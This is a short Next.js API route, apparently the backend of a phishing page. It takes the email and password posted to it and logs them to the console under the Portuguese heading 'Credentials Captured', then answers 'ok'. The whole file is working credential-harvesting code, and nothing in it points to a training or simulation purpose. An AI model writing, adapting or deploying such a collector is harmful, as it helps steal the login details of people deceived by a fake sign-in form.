// Next.js API route support: https://nextjs.org/docs/api-routes/introduction

export default function handler(req, res) {
  const { method } = req

  if (method !== 'POST') {
    res.status(405).json({ message: 'Method not allowed' })
    return
  }

  const { email, password } = req.body

  const message = `🥃 Credenciais Capturadas 🥃`

  console.log(message)
  console.log(`Email: ${email}`)
  console.log(`Password: ${password}`)

  res.status(200).json({ message: 'ok' })
}